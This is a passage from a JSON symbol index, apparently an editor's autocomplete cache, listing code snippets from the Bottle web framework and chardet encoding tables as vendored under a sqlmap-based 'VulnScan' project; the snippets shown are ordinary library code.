        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "tonat = touni if py3k else tob\ndef _stderr(*args):\n    try:\n        print(*args, file=sys.stderr)\n    except (IOError, AttributeError):\n        pass # Some environments do not allow printing (mod_wsgi)\n# A bug in functools causes it to break if the wrapper is an instance method\ndef update_wrapper(wrapper, wrapped, *a, **ka):\n    try:\n        functools.update_wrapper(wrapper, wrapped, *a, **ka)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Request",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "Request = BaseRequest\nResponse = BaseResponse\nclass HTTPResponse(Response, BottleException):\n    def __init__(self, body='', status=None, headers=None, **more_headers):\n        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)\n    def apply(self, other):\n        other._status_code = self._status_code\n        other._status_line = self._status_line\n        other._headers = self._headers\n        other._cookies = self._cookies",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Response",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "Response = BaseResponse\nclass HTTPResponse(Response, BottleException):\n    def __init__(self, body='', status=None, headers=None, **more_headers):\n        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)\n    def apply(self, other):\n        other._status_code = self._status_code\n        other._status_line = self._status_line\n        other._headers = self._headers\n        other._cookies = self._cookies\n        other.body = self.body",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_UNSET",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "_UNSET = object()\nclass ConfigDict(dict):\n    \"\"\" A dict-like configuration storage with additional support for\n        namespaces, validators, meta-data, overlays and more.\n        This dict-like class is heavily optimized for read access. All read-only\n        methods as well as item access should be as fast as the built-in dict.\n    \"\"\"\n    __slots__ = ('_meta', '_change_listener', '_overlays', '_virtual_keys', '_source', '__weakref__')\n    def __init__(self):\n        self._meta = {}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_hsplit",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "_hsplit = re.compile('(?:(?:\"((?:[^\"\\\\\\\\]|\\\\\\\\.)*)\")|([^;,=]+))([;,=]?)').findall\ndef _parse_http_header(h):\n    \"\"\" Parses a typical multi-valued and parametrised HTTP header (e.g. Accept headers) and returns a list of values\n        and parameters. For non-standard or broken input, this implementation may return partial results.\n    :param h: A header string (e.g. ``text/html,text/plain;q=0.9,*/*;q=0.8``)\n    :return: List of (value, params) tuples. The second element is a (possibly empty) dict.\n    \"\"\"\n    values = []\n    if '\"' not in h:  # INFO: Fast path without regexp (~2x faster)\n        for value in h.split(','):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "uninstall",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "uninstall = make_default_app_wrapper('uninstall')\nurl       = make_default_app_wrapper('get_url')\n###############################################################################\n# Server Adapter ###############################################################\n###############################################################################\n# Before you edit or add a server adapter, please read:\n# - https://github.com/bottlepy/bottle/pull/647#issuecomment-60152870\n# - https://github.com/bottlepy/bottle/pull/865#issuecomment-242795341\nclass ServerAdapter(object):\n    quiet = False",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "server_names",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "server_names = {\n    'cgi': CGIServer,\n    'flup': FlupFCGIServer,\n    'wsgiref': WSGIRefServer,\n    'waitress': WaitressServer,\n    'cherrypy': CherryPyServer,\n    'cheroot': CherootServer,\n    'paste': PasteServer,\n    'fapws3': FapwsServer,\n    'tornado': TornadoServer,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_debug",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "_debug = debug\ndef run(app=None,\n        server='wsgiref',\n        host='127.0.0.1',\n        port=8080,\n        interval=1,\n        reloader=False,\n        quiet=False,\n        plugins=None,\n        debug=None,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "mako_template",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "mako_template = functools.partial(template, template_adapter=MakoTemplate)\ncheetah_template = functools.partial(template,\n                                     template_adapter=CheetahTemplate)\njinja2_template = functools.partial(template, template_adapter=Jinja2Template)\ndef view(tpl_name, **defaults):\n    \"\"\" Decorator: renders a template for a handler.\n        The handler can control its behavior like that:\n          - return a dict of template vars to fill out the template\n          - return something other than a dict and the view decorator will not\n            process the template, but return the handler result as is.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cheetah_template",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "cheetah_template = functools.partial(template,\n                                     template_adapter=CheetahTemplate)\njinja2_template = functools.partial(template, template_adapter=Jinja2Template)\ndef view(tpl_name, **defaults):\n    \"\"\" Decorator: renders a template for a handler.\n        The handler can control its behavior like that:\n          - return a dict of template vars to fill out the template\n          - return something other than a dict and the view decorator will not\n            process the template, but return the handler result as is.\n            This includes returning a HTTPResponse(dict) to get,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "jinja2_template",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "jinja2_template = functools.partial(template, template_adapter=Jinja2Template)\ndef view(tpl_name, **defaults):\n    \"\"\" Decorator: renders a template for a handler.\n        The handler can control its behavior like that:\n          - return a dict of template vars to fill out the template\n          - return something other than a dict and the view decorator will not\n            process the template, but return the handler result as is.\n            This includes returning a HTTPResponse(dict) to get,\n            for instance, JSON with autojson or other castfilters.\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "mako_view",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "mako_view = functools.partial(view, template_adapter=MakoTemplate)\ncheetah_view = functools.partial(view, template_adapter=CheetahTemplate)\njinja2_view = functools.partial(view, template_adapter=Jinja2Template)\n###############################################################################\n# Constants and Globals ########################################################\n###############################################################################\nTEMPLATE_PATH = ['./', './views/']\nTEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cheetah_view",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "cheetah_view = functools.partial(view, template_adapter=CheetahTemplate)\njinja2_view = functools.partial(view, template_adapter=Jinja2Template)\n###############################################################################\n# Constants and Globals ########################################################\n###############################################################################\nTEMPLATE_PATH = ['./', './views/']\nTEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "jinja2_view",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "jinja2_view = functools.partial(view, template_adapter=Jinja2Template)\n###############################################################################\n# Constants and Globals ########################################################\n###############################################################################\nTEMPLATE_PATH = ['./', './views/']\nTEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TEMPLATE_PATH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "TEMPLATE_PATH = ['./', './views/']\nTEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TEMPLATES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "TEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "DEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "NORUN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "NORUN = False  # If set, run() does nothing. Used by load_app()\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[418]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[428]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[429]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[431]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[451]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n    <html>",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTP_CODES[511]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "HTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n    <html>\n        <head>",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_HTTP_STATUS_LINES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n    <html>\n        <head>\n            <title>Error: {{e.status}}</title>",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "ERROR_PAGE_TEMPLATE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "ERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n    <html>\n        <head>\n            <title>Error: {{e.status}}</title>\n            <style type=\"text/css\">\n              html {background-color: #eee; font-family: sans-serif;}\n              body {background-color: #fff; border: 1px solid #ddd;",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "request",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "request = LocalRequest()\n#: A thread-safe instance of :class:`LocalResponse`. It is used to change the\n#: HTTP response for the *current* request.\nresponse = LocalResponse()\n#: A thread-safe namespace. Not used by Bottle.\nlocal = threading.local()\n# Initialize app stack (create first empty Bottle app now deferred until needed)\n# BC: 0.6.4 and needed for run()\napps = app = default_app = AppStack()\n#: A virtual package that redirects import statements.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "response",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "response = LocalResponse()\n#: A thread-safe namespace. Not used by Bottle.\nlocal = threading.local()\n# Initialize app stack (create first empty Bottle app now deferred until needed)\n# BC: 0.6.4 and needed for run()\napps = app = default_app = AppStack()\n#: A virtual package that redirects import statements.\n#: Example: ``import bottle.ext.sqlite`` actually imports `bottle_sqlite`.\next = _ImportRedirect('bottle.ext' if __name__ == '__main__' else\n                      __name__ + \".ext\", 'bottle_%s').module",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "local",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "local = threading.local()\n# Initialize app stack (create first empty Bottle app now deferred until needed)\n# BC: 0.6.4 and needed for run()\napps = app = default_app = AppStack()\n#: A virtual package that redirects import statements.\n#: Example: ``import bottle.ext.sqlite`` actually imports `bottle_sqlite`.\next = _ImportRedirect('bottle.ext' if __name__ == '__main__' else\n                      __name__ + \".ext\", 'bottle_%s').module\ndef _main(argv):  # pragma: no coverage\n    args, parser = _cli_parse(argv)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "apps",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "apps = app = default_app = AppStack()\n#: A virtual package that redirects import statements.\n#: Example: ``import bottle.ext.sqlite`` actually imports `bottle_sqlite`.\next = _ImportRedirect('bottle.ext' if __name__ == '__main__' else\n                      __name__ + \".ext\", 'bottle_%s').module\ndef _main(argv):  # pragma: no coverage\n    args, parser = _cli_parse(argv)\n    def _cli_error(cli_msg):\n        parser.print_help()\n        _stderr('\\nError: %s\\n' % cli_msg)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "ext",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "ext = _ImportRedirect('bottle.ext' if __name__ == '__main__' else\n                      __name__ + \".ext\", 'bottle_%s').module\ndef _main(argv):  # pragma: no coverage\n    args, parser = _cli_parse(argv)\n    def _cli_error(cli_msg):\n        parser.print_help()\n        _stderr('\\nError: %s\\n' % cli_msg)\n        sys.exit(1)\n    if args.version:\n        print('Bottle %s' % __version__)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BIG5_TYPICAL_DISTRIBUTION_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "peekOfCode": "BIG5_TYPICAL_DISTRIBUTION_RATIO = 0.75\n#Char to FreqOrder table\nBIG5_TABLE_SIZE = 5376\nBIG5_CHAR_TO_FREQ_ORDER = (\n   1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110, #   16\n3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653, #   32\n1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932, #   48\n  63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822, #   64\n3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013, #   80\n4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604, #   96",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "documentation": {}
    },
    {
        "label": "BIG5_TABLE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "peekOfCode": "BIG5_TABLE_SIZE = 5376\nBIG5_CHAR_TO_FREQ_ORDER = (\n   1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110, #   16\n3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653, #   32\n1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932, #   48\n  63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822, #   64\n3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013, #   80\n4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604, #   96\n5015,2501,1977,1978, 155,1991, 645, 641,1606,5016,3452, 337,  72, 406,5017,  80, #  112\n 630, 238,3205,1509, 263, 939,1092,2654, 756,1440,1094,3453, 449,  69,2987, 591, #  128",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "documentation": {}
    },
    {
        "label": "BIG5_CHAR_TO_FREQ_ORDER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "peekOfCode": "BIG5_CHAR_TO_FREQ_ORDER = (\n   1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110, #   16\n3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653, #   32\n1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932, #   48\n  63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822, #   64\n3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013, #   80\n4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604, #   96\n5015,2501,1977,1978, 155,1991, 645, 641,1606,5016,3452, 337,  72, 406,5017,  80, #  112\n 630, 238,3205,1509, 263, 939,1092,2654, 756,1440,1094,3453, 449,  69,2987, 591, #  128\n 179,2096, 471, 115,2035,1844,  60,  50,2988, 134, 806,1869, 734,2036,3454, 180, #  144",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.big5freq",
        "documentation": {}
    },
    {
        "label": "Big5Prober",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.big5prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.big5prober",
        "peekOfCode": "class Big5Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(Big5Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(BIG5_SM_MODEL)\n        self.distribution_analyzer = Big5DistributionAnalysis()\n        self.reset()\n    @property\n    def charset_name(self):\n        return \"Big5\"\n    @property",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.big5prober",
        "documentation": {}
    },
    {
        "label": "CharDistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class CharDistributionAnalysis(object):\n    ENOUGH_DATA_THRESHOLD = 1024\n    SURE_YES = 0.99\n    SURE_NO = 0.01\n    MINIMUM_DATA_THRESHOLD = 3\n    def __init__(self):\n        # Mapping table to get frequency order from char order (get from\n        # GetOrder())\n        self._char_to_freq_order = None\n        self._table_size = None  # Size of above table",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "EUCTWDistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class EUCTWDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCTWDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = EUCTW_CHAR_TO_FREQ_ORDER\n        self._table_size = EUCTW_TABLE_SIZE\n        self.typical_distribution_ratio = EUCTW_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for euc-TW encoding, we are interested\n        #   first  byte range: 0xc4 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "EUCKRDistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
